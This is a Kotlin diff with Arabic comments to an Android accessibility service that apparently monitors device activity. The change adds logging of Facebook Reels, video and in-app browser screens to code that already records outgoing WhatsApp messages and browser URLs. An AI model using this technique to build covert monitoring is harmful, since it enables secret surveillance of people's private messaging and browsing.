@@ -56,6 +56,10 @@ class UrlAccessibilityService : AccessibilityService() {
         private var lastSentText = ""
         private var lastSentAt = 0L
         private var lastChatName = ""
+
+        // حالة رصد شاشات فيسبوك (ريلز/فيديو/روابط داخلية)
+        private var lastFbTitle = ""
+        private var lastFbAt = 0L
     }
 
     private val handler = Handler(Looper.getMainLooper())
@@ -67,6 +71,11 @@ class UrlAccessibilityService : AccessibilityService() {
         // رسائل واتساب الصادرة (ضغط زر الإرسال) — تُرصد هنا لأنها لا تصدر إشعارًا
         if (Config.isWhatsApp(pkg)) {
             handleWhatsAppEvent(pkg, event)
+            return
+        }
+        // شاشات فيسبوك: الريلز، مشاهدة فيديو، الروابط المفتوحة داخل متصفح فيسبوك
+        if (Config.isFacebook(pkg)) {
+            handleFacebookEvent(pkg, event)
             return
         }
         if (!Config.isBrowser(pkg)) return
@@ -158,6 +167,58 @@ class UrlAccessibilityService : AccessibilityService() {
         "com.whatsapp" -> "WhatsApp"
         "com.whatsapp.w4b" -> "WhatsApp Business"
         else -> if (pkg.contains("gb", true)) "GBWhatsApp" else "WhatsApp"
+    }
+
+    // ---------- رصد محتوى فيسبوك (ريلز/فيديو/روابط داخلية) ----------
+
+    /**
+     * من اسم نافذة التطبيق نعرف نوع الشاشة:
+     *  - نشاط الريلز  ← «الريلز — فيسبوك»
+     *  - نشاط فيديو/مشاهدة ← «مشاهدة فيديو — فيسبوك»
+     *  - متصفح فيسبوك الداخلي ← عنوان الصفحة إن أمكن قراءته وإلا «رابط خارجي داخل فيسبوك»
+     * الشاشات العادية (الرئيسية، الملف الشخصي...) لا تُسجل — موجودة أصلًا في تبويب «التطبيقات».
+     * أما عنوان الفيديو/الريل نفسه فيُرصد من MediaWatcher (جلسات الوسائط).
+     */
+    private fun handleFacebookEvent(pkg: String, event: AccessibilityEvent) {
+        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+        val cls = event.className?.toString() ?: return
+        val lower = cls.lowercase()
+
+        val title: String
+        val screen: String
+        when {
+            lower.contains("reel") -> { title = "الريلز — فيسبوك"; screen = "reels" }
+            lower.contains("video") || lower.contains("watch") -> { title = "مشاهدة فيديو — فيسبوك"; screen = "video" }
+            lower.contains("browser") || lower.contains("webview") -> {
+                // متصفح فيسبوك الداخلي: عنوان الصفحة غالبًا أول نص في حدث النافذة
+                val page = event.text?.firstOrNull { t -> !t.isNullOrBlank() && t.length <= 120 }?.toString()?.trim()
+                title = if (!page.isNullOrEmpty()) page else "رابط خارجي داخل فيسبوك"
+                screen = "link"
+            }
+            else -> return
+        }
+        if (title.length < 3) return
+
+        val now = System.currentTimeMillis()
+        if (title == lastFbTitle && now - lastFbAt < 30_000) return  // أحداث متتالية لنفس الشاشة
+        lastFbTitle = title
+        lastFbAt = now
+
+        val json = org.json.JSONObject()
+            .put("type", "MEDIA")
+            .put("title", title.take(120))
+            .put("app", fbName(pkg))
+            .put("packageName", pkg)
+            .put("meta", org.json.JSONObject().put("screen", screen))
+        EventStore.addEvent(applicationContext, json)
+    }
+
+    private fun fbName(pkg: String): String = when (pkg.lowercase()) {
+        "com.facebook.katana" -> "فيسبوك"
+        "com.facebook.lite" -> "فيسبوك لايت"
+        "com.facebook.orca" -> "ماسنجر"
+        "com.facebook.mlite" -> "Messenger Lite"
+        else -> "فيسبوك"
     }
 
     override fun onInterrupt() {}
